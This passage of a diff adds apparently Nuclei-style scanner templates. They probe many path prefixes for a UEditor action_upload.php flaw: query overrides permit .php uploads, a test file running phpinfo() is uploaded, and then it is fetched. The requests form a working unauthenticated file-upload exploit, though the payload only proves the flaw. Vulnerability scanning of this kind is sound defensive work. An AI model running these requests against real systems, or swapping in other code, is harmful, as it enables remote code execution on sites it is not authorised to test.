+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /cms/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/cms/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /admin/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=admin/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /admin/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/admin/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /administrator/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=administrator/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /administrator/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/administrator/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /manage/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=manage/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /manage/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/manage/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /management/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=management/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /management/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/management/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /manager/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=manager/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /manager/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/manager/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /console/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=console/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /console/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/console/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /dashboard/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=dashboard/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /dashboard/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/dashboard/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /backend/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=backend/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /backend/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/backend/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /editor/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=editor/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /editor/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/editor/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /system/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=system/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /system/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/system/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /core/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=core/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /core/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/core/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /app/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=app/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /app/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/app/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /application/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=application/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /application/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/application/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /resources/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=resources/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /resources/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/resources/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /web/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=web/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /web/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/web/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
+        POST /www/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=www/ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /www/ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/www/ueditor/php/upload/aaaa\\.php"
+
+  - raw:
+      - |
